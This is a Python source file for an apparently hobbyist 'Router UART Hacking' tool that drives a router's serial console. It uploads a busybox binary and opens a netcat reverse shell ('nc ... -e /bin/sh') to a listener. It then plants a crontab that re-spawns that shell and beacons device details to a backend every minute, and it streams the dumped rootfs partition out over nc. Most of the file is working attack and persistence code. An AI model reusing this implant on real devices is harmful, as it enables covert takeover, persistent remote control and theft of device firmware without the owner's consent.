import re
import sys
import serial
import requests
import netifaces as ni

from time import sleep
from shutil import copyfile
from colorama import init, Fore, Back, Style

init(autoreset=True)  # Colorama autoreset


DEV_SERIAL_PORT = "/dev/ttyS0"
BACKEND_ENDPOINT = "http://192.168.31.108:5000/updateGet"

REVERSE_SHELL_IP   = "192.168.31.127"
REVERSE_SHELL_PORT = 4444

DEVICE_CONFIG = {"name":"router_asus", "status":"ON", "shellIP":REVERSE_SHELL_IP, "shellPort":REVERSE_SHELL_PORT}



def read_data(ser):
    """
        Read bytes until there is no more avaliable on the serial port
        and return the result of the read
    """

    received_data = ser.read()
    sleep(0.1)

    while ser.inWaiting() > 0:
        data_left = ser.inWaiting()
        received_data += ser.read(data_left)
        sleep(0.1)

    datos_recibidos = received_data.decode("utf-8")

    return datos_recibidos


def write_data(ser, command):
    """
        Write any command to the device connected through the serial port
    """

    WaitBytes = ser.write((command + "\n").encode())
    ser.read(WaitBytes)  # To avoid reading the input after writing it


def parse_output(output):
    """
        Parse output from read_data to delete ansi code
    """
    ansi_escape = re.compile(r'(?:\x1B[@-_]|[\x80-\x9F])[0-?]*[ -/]*[@-~]')
    result = ansi_escape.sub('', output).replace("\r", "")

    final_output = ""
    for line in result.split("\n"):

        if line == "" or line == "[root@OpenWrt]" or line == "/ # ":
            pass

        else:
            final_output += line + "\n"

    return final_output


def send_command(ser, command):
    """
        Send any command and get the result
    """
    write_data(ser, command)

    return parse_output(read_data(ser))


def find_baudrate():
    """
        For autofinding the correct baudrate of the device (reads the terminal ports until there are valid ascii code on it)
    """

    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|    AUTOFIND BAUDRATE   |")
    print(Fore.CYAN + "+------------------------+")

    test_serial = serial.Serial(DEV_SERIAL_PORT)

    baudrates = [1200, 1800, 2400, 4800, 9600, 38400, 19200, 57600, 115200]

    final_baudrate = 0
    valid_baudrates = 0

    for baud in baudrates:

        try:
            print(Fore.YELLOW + "Testing " + str(baud) + "->", end=" ")

            test_serial.baudrate = baud
            read_data(test_serial)
            final_baudrate = baud

            print(Fore.GREEN + "OK")
            valid_baudrates += 1

        except:
            print(Fore.RED + "Not valid")

    if final_baudrate != 0:

        if valid_baudrates != 1:
            print("\n\n" + Back.RED + "Found multiple valid baudrates, possible error but It will try with the last "
                                      "baudrate found (usually it's the correct one)")

        print(Fore.GREEN + "\n\nBaudrate to work with: " + str(final_baudrate))

    else:
        final_baudrate = 0

    return final_baudrate


def get_terminal(ser):
    """
        Gives the user access to the device terminal
    """
    command = ""

    while command != "exit from terminal":
        command = input(">> ")
        print(send_command(ser, command), end="")


def check_if_terminal(ser):
    """
        Check if a terminal responds 
    """

    print("\n● " + Fore.YELLOW + "Baudrate: " + Fore.WHITE + str(ser.baudrate))
    print("● Checking if there is terminal access:", end="")

    response = send_command(ser, "echo hola")

    if "hola" in response:

        print(Fore.GREEN + " ------> Got terminal ✓\n")
        return True

    else:

        print(Fore.RED + " ------> No terminal X")
        return False


def title():
    print(Fore.CYAN + """                                                                       
8888888b.        888     888       d8888 8888888b. 88888888888 
888   Y88b       888     888      d88888 888   Y88b    888     
888    888       888     888     d88P888 888    888    888     
888   d88P       888     888    d88P 888 888   d88P    888     
8888888P"        888     888   d88P  888 8888888P"     888     
888 T88b  888888 888     888  d88P   888 888 T88b      888     
888  T88b        Y88b. .d88P d8888888888 888  T88b     888     
888   T88b        "Y88888P" d88P     888 888   T88b    888     
    """)

    print(Fore.MAGENTA + "\t\t//////// Router UART Hacking by Carliquiss ////////\n\n")


def ducks():
    print(Fore.CYAN + "\n\nBye bye...")
    print(Fore.CYAN +
          """
          _      _      _
        <(.)__ <(.)__ <(.)__
         (___/  (___/  (___/..........
        """)


def find_user(ser):
    """
        Find the user we have on the device shell
    """
    user_info = send_command(ser, "id")

    if "found" in user_info.split():
        user_info = send_command(ser, "echo $USER")

    return user_info.split("\n")[0]


def print_info(info):
    """
        Print a JSON in a pretty way
    """

    for item in info:
        try:
            print(Fore.YELLOW + item + ": " + Fore.WHITE + info[item])

        except:
            pass


def get_info(ser):
    """
        Execute differents commands to get general info about the device
    """

    print()
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|  CHECKING DEVICE INFO  |")
    print(Fore.CYAN + "+------------------------+")

    device_info = {}

    device_info["system"] = send_command(ser, "uname -a").split("\n")[0]
    device_info["user"] = find_user(ser)
    device_info["partitions"] = send_command(ser, "cat /proc/mtd")
    device_info["busybox"] = send_command(ser, "busybox")

    print_info(device_info)

    return device_info


def extract_rootfs(ser):
    """
        Extracts the rootfs partition from the device to /tmp/rootfs.bin (on the device)
    """
    
    print()
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|   EXTRACTING ROOTFS    |")
    print(Fore.CYAN + "+------------------------+")
    print("\n● Extracting rootfs partition to /tmp/rootfs.bin.... ", end="")

    try:
        if "/tmp/rootfs.bin" in send_command(ser, "ls /tmp/rootfs.bin").split("\n"):
            print(Fore.GREEN + "Already extracted ✓\n")

        else:

            partitions_info = send_command(ser, "cat /proc/mtd").split("\n")

            for partition in partitions_info:

                partition = partition.split()

                if len(partition) == 4:

                    dev = partition[0].replace(":", "")
                    name = partition[3].replace('"', "")

                    if name == "rootfs":
                        partition_block = "mtdblock" + dev[-1]
                        send_command(ser, "dd if=/dev/" + partition_block + " of=/tmp/" + name + ".bin bs=4096")

                        print(Fore.GREEN + "Extraction completed ✓\n")
        
        sleep(2)
        network_status, rpi_ip = check_networking(ser)
        
        if network_status: 
            send_command(ser, "cat /tmp/rootfs.bin | /tmp/busybox_el nc {} {}".format(rpi_ip, 4445))
            print(Fore.GREEN + "rootfs.bin copied to Raspberry ✓\n")
            
        else:
            print(Fore.RED + " ------> Error copying rootfs.bin to Raspberry X:\n" + error)


    except Exception as error:
        print(Fore.RED + " ------> Error during process X:\n" + error)


def check_networking(ser):
    """
        Checks if the raspberry and the router are in the same network
    """
    try:
        raspberry_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
        device_ip = send_command(ser, 'ifconfig | grep "inet"').split()[1].replace("addr:", "")
        print("LA IP DEL DISPOSITIVO ES: " + device_ip)
        
        print()
        print("● Checking connectivity:")
        print("+--------------------------------+")
        print("|  " + Fore.YELLOW + "Raspberry IP: " + Fore.WHITE + "%-16s" % raspberry_ip + "|")
        print("|  " + Fore.YELLOW + "Device    IP: " + Fore.WHITE + "%-16s" % device_ip + "|")
        print("+--------------------------------+")

        if raspberry_ip.rsplit(".")[0] == device_ip.rsplit(".")[0]:

            print(Fore.GREEN + "-----> Raspberry and Device on the same network ✓")
            return True, raspberry_ip

        else:
            print(
                Fore.RED + "▬ The device and the Raspberry Pi are not in the same network, please connect the Rasperry to "
                           "the router")

            return False, raspberry_ip
    
    
    except Exception as error:
        print(Fore.RED + "Error getting device IP")
        print(error)


def check_web_server():
    """
        Checks if the raspberry has Apache running (to do a wget on the router and gets the binaries)
    """

    try:
        request = requests.get("http://localhost")

        if "Apache" in request.headers['server']:

            print(Fore.GREEN + "-----> Apache working ✓")
            return True

        else:
            print(Fore.RED + "-----> Apache not working X")

    except:
        print(Fore.RED + "-----> Apache not working X")

    return False


def copy_file(ser, file_path, final_path):
    
    print()
    print(Fore.YELLOW + "+------------------------+")
    print(Fore.YELLOW + "|     COPYING  FILE      |")
    print(Fore.YELLOW + "+------------------------+")
    
    network_status, rpi_ip = check_networking(ser)
    
    file_name = file_path.split("/")[-1]
    copy_path = "/var/www/html/{}".format(file_name)
    

    try:
        copyfile(file_path, copy_path)

        if check_web_server() and network_status:
            send_command(ser, "wget -O {} http://{}/{}".format(final_path, rpi_ip, file_name))
            print(Fore.GREEN + "-----> {} copied succesfully ✓".format(file_name))
            

    except Exception as error:

        print(Fore.RED + "Error pushing file, error -> ")
        print(error)



def get_reverse_shell(ser):
    """
        Send a reverse shell connection to the ip and port provided
    """
    
    print()
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|      REVERSE SHELL     |")
    print(Fore.CYAN + "+------------------------+")
    
    copy_file(ser, "./binaries/busybox-mipsel", "/tmp/busybox_el")
    
    print("● Setting reverse shell to {}:{}".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
    send_command(ser, "chmod +x /tmp/busybox_el")
    send_command(ser, "/tmp/busybox_el nc {} {} -e /bin/sh &".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))


def config_crontab(ser):
    
    print()
    print(Fore.CYAN + "+------------------------+")
    print(Fore.CYAN + "|  CONFIGURING CRONTAB   |")
    print(Fore.CYAN + "+------------------------+")
    
    
    with open("./binaries/cronFile", "w") as cronfile:
        cronfile.write("* * * * * /tmp/sendInfo.sh\n")
        cronfile.write("* * * * * /tmp/busybox_el nc {} {} -e /bin/sh &".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
        
        
    with open("./binaries/sendInfo.sh", "w") as infofile:
        infofile.write('wget -O- "{}?'.format(BACKEND_ENDPOINT))
        
        for field in DEVICE_CONFIG:
            infofile.write("{}={}&".format(field, DEVICE_CONFIG[field]))
            
        infofile.write('"')
            
            
        
    
    copy_file(ser, "./binaries/cronFile", "/tmp/cronFile")
    copy_file(ser, "./binaries/sendInfo.sh", "/tmp/sendInfo.sh")
    send_command(ser, "chmod +x /tmp/sendInfo.sh")
    send_command(ser, "crontab /tmp/cronFile")
    
    
    
def auto_mode():
    """
        Usage: python3 main.py -a

        Waits to receive data from the serial port and tries to find the baudrate of the device.
        First, it extracts rootfs patition and hack the device. Then, give you the option to open a terminal.
    """

    baudrate = find_baudrate()

    ser = serial.Serial(DEV_SERIAL_PORT, baudrate)

    if baudrate != 0:

        print("\n● Please wait 40 seconds just to be sure the device is fully booted")
        sleep(40)

        if check_if_terminal(ser):

            get_info(ser)
            print(Back.CYAN + "\n")
            get_reverse_shell(ser)
            print(Back.CYAN + "\n")
            config_crontab(ser)
            print(Back.CYAN + "\n")
            extract_rootfs(ser)
            
            
            response = input("\nDo you want to open the terminal? (Y/N) ")

            if response.upper() == "Y":
                print(Fore.CYAN + " To exit the terminal and finish the program just enter 'exit from terminal' on the command line")
                get_terminal(ser)

            ducks()

    else:
        print(Fore.RED + "No valid baudrate found, quitting the program...")



def direct_mode():
    """
        Usage: python3 main.py -d [baudrate]

        Like automode but specifing the baudrate value
    """

    try:

        baudrate = sys.argv[2]
        ser = serial.Serial(DEV_SERIAL_PORT, baudrate)

        if check_if_terminal(ser):
            
            get_info(ser)
            print(Back.CYAN + "\n")
            get_reverse_shell(ser)
            print(Back.CYAN + "\n")
            config_crontab(ser)
            print(Back.CYAN + "\n")
            extract_rootfs(ser)
            
            response = input("\n● Do you want to open the terminal? (Y/N) ")

            if response.upper() == "Y":
                print(Fore.CYAN + "\n  To exit the terminal and finish the program just enter 'exit from terminal' on the command line\n")
                get_terminal(ser)

            ducks()


    except Exception as error:

        if str(error) == "list index out of range":
            print(Fore.RED + "No baudrate value provided \n\n")
            print_usage()
        
        else:    
            print(Fore.RED + "No baudrate valid value ({} type instead of integer) \n\n".format(type(baudrate)))
            #print(Fore.YELLOW + str(error))


def terminal_mode():
    """
        Usage: python3 main.py -t [baudrate]

        Connets directly to the device terminal with the baudrate given
    """

    try:

        baudrate = sys.argv[2]
        ser = serial.Serial(DEV_SERIAL_PORT, baudrate)

        if check_if_terminal(ser):
            get_terminal(ser)
            ducks()


    except Exception as error:
        
        if str(error) == "list index out of range":
            print(Fore.RED + "No baudrate value provided \n\n")
            print_usage()
        
        else:    
            print(Fore.RED + "No baudrate valid value ({} type instead of integer) \n\n".format(type(baudrate)))
            #print(Fore.YELLOW + str(error))





def print_usage():
    
    print(Fore.RED + "\n\nPlease see usage below: \n")
    print("Usage: ")
    print("\tAutomatic mode:  " + Fore.CYAN + "'sudo python3 main.py -a (--auto)'")
    print("\tTerminal  mode:  " + Fore.CYAN + "'sudo python3 main.py -t (--terminal) 57600'" + "  (or whatever baudrate the router uses)")
    print("\tDirect    mode:  " + Fore.CYAN + "'sudo python3 main.py -d (--direct) 57600'" + "  (or whatever baudrate the router uses)")    
    print("\n")


def main():

    title()

    try:
        if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
            terminal_mode()

        elif sys.argv[1] == "-d" or sys.argv[1] == "--direct":
            direct_mode()
                
        elif sys.argv[1] == "-a" or sys.argv[1] == "--auto":
            auto_mode()
        
    except:
        print_usage()
        


if __name__ == "__main__":
    main()
